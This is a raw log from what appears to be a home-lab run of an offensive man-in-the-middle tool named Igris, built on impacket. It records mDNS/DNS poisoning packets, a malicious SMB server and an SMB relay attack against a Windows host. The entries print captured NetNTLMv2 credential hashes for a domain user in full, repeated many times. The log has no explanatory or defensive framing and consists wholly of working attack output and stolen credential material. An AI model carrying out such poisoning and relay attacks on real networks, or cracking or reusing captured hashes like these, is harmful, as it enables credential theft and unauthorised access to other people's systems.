2021-11-12 15:11:52.893 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000
2021-11-12 15:11:52.893 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:52.894 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:49 - holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
2021-11-12 15:11:52.914 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:11:52.915 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000']
2021-11-12 15:11:58.212 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:58.261 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:58.261 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:11:58.310 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:58.311 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:58.312 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:11:58.354 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:58.355 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:58.359 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:58.360 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:59.215 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49859)
2021-11-12 15:11:59.218 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000']
2021-11-12 15:11:59.248 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-12 15:11:59.250 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000']
2021-11-12 15:11:59.251 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-12 15:11:59.252 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000']
2021-11-12 15:11:59.253 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:3970b2b3fd7a67c05c9ae0e21a0c99a0:0101000000000000808965a3d7d7d70104ac085a0b2b28ec0000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800808965a3d7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000
2021-11-12 15:11:59.254 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000']
2021-11-12 15:11:59.255 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:49 - holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
2021-11-12 15:11:59.276 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-12 15:11:59.276 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000', 'benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:3970b2b3fd7a67c05c9ae0e21a0c99a0:0101000000000000808965a3d7d7d70104ac085a0b2b28ec0000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800808965a3d7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:11:59.290 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-12 15:11:59.291 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000', 'benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:3970b2b3fd7a67c05c9ae0e21a0c99a0:0101000000000000808965a3d7d7d70104ac085a0b2b28ec0000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800808965a3d7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:11:59.379 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:11:59.380 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000', 'benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:3970b2b3fd7a67c05c9ae0e21a0c99a0:0101000000000000808965a3d7d7d70104ac085a0b2b28ec0000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800808965a3d7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:12:03.647 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-12 15:12:03.648 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000', 'benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:3970b2b3fd7a67c05c9ae0e21a0c99a0:0101000000000000808965a3d7d7d70104ac085a0b2b28ec0000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800808965a3d7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:12:03.656 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49858)
2021-11-12 15:12:03.657 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000', 'benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:3970b2b3fd7a67c05c9ae0e21a0c99a0:0101000000000000808965a3d7d7d70104ac085a0b2b28ec0000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800808965a3d7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:12:03.658 | INFO     | impacket.smbserver:log:4132 - Remaining connections ['Thread-7']
2021-11-12 15:12:03.659 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000', 'benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:3970b2b3fd7a67c05c9ae0e21a0c99a0:0101000000000000808965a3d7d7d70104ac085a0b2b28ec0000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800808965a3d7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:12:07.302 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-12 15:14:52.456 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-12 15:14:52.457 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-12 15:14:52.461 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-12 15:14:52.468 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-12 15:14:52.468 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-12 15:14:52.475 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-12 15:14:52.475 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:14:52.476 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-12 15:14:52.477 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:14:52.478 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-12 15:14:52.478 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:14:56.119 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:14:56.119 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:14:56.119 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:14:56.155 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:14:56.155 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:14:56.155 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:14:56.187 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:14:56.187 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:14:56.188 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:14:56.188 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:14:57.114 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:14:57.115 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:14:57.120 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:14:57.121 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:14:57.123 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49862)
2021-11-12 15:14:57.124 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:14:57.156 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-12 15:14:57.157 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:14:57.159 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-12 15:14:57.160 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:14:57.161 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000
2021-11-12 15:14:57.162 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:14:57.187 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:14:57.188 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:14:57.673 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:14:57.674 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:15:01.643 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:15:01.643 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:15:05.499 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:15:05.500 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:15:05.501 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:15:05.544 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:15:05.544 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:15:05.544 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:15:05.580 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:15:05.580 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:15:05.582 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:15:05.582 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:15:06.500 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:15:06.501 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:15:06.503 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:15:06.503 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:15:06.503 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49863)
2021-11-12 15:15:06.504 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:15:06.514 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-12 15:15:06.514 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:15:06.514 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-12 15:15:06.515 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4df261815a523999d803858800db7183:0101000000000000802e7e0dd8d7d701f905c19a5716f813000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f00720044006600460007000800802e7e0dd8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0063006f007300690074006100730063006f00730061002e006c006f00630061006c000000000000000000']
2021-11-12 15:15:06.515 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:0522b3e50dc18cc239c6ede77d978845:01010000000000000079db12d8d7d701280d1591bf38c8de000000000100100054006f006f004b004b007800730069000300100054006f006f004b004b00780073006900020010007300610054004f007200440066004600040010007300610054004f007200440066004600070008000079db12d8d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002e0063006900660073002f006100740061007100750065006500650065006500650065002e006c006f00630061006c000000000000000000
